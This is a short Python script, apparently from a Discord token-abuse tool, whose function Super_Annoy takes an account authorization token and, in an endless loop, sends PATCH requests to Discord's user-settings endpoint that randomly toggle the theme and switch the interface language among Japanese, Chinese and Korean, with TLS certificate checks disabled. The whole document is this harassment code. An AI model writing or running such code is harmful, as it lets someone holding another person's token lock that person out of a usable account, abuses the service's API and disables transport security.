import requests
import random

def Super_Annoy(token):
    while True:
        annoy = {'theme': random.choice(['dark', 'light']), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v7/users/@me/settings", headers = {"Authorization": token}, json = annoy, verify = False)
        print('Annoyed again')
